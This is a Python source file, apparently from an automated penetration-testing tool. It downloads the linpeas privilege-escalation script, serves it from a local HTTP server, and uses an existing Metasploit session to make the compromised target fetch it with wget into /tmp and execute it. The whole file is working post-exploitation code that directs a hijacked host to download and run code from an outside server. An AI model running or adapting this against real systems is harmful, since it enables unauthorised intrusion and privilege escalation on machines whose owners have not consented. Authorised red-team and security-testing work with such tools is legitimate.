import http.server
import socketserver
import threading
import os
import subprocess
import time
import tempfile
import shutil
from pathlib import Path

def run_http_server(port, directory):
    os.chdir(directory) 
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
        print(f"HTTP server started on port {port}")
        httpd.serve_forever()

def run_linpeas(executor, options=None):

    temp_dir = tempfile.mkdtemp()
    linpeas_path = os.path.join(temp_dir, "linpeas.sh")
    
    try:
        print("Downloading linpeas.sh...")
        subprocess.run(
            f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > {linpeas_path}",
            shell=True,
            text=True,
            check=True
        )
        subprocess.run(
            f"chmod +x {linpeas_path}",
            shell=True,
            text=True,
            check=True
        )
        port = 8080
        http_thread = threading.Thread(target=run_http_server, args=(port, temp_dir))
        http_thread.daemon = True
        http_thread.start()
        time.sleep(2)

        sessions = executor.get_sessions()
        if not sessions:
            raise Exception("No sessions available")
            
        session_id = list(sessions.keys())[0]
        print(f"Using session: {session_id}")
        
        print(f"Executing linpeas on target {executor.host}...")
        commands = [
            f'wget http://{executor.host}:{port}/linpeas.sh -O /tmp/linpeas.sh',
            'chmod +x /tmp/linpeas.sh',
            '/tmp/linpeas.sh'
        ]
        result = executor.communicate_with_msf_session(
            session_id=session_id,
            input_texts=commands,
            forever=True
        )
        print(f"Linpeas execution results: {result}")

        time.sleep(5)
        
    except subprocess.CalledProcessError as e:
        print(f"Error during linpeas setup: {e}")
        raise
    except Exception as e:
        print(f"Unexpected error: {e}")
        raise
    finally:
        try:
            shutil.rmtree(temp_dir)
        except Exception as e:
            print(f"{e}")

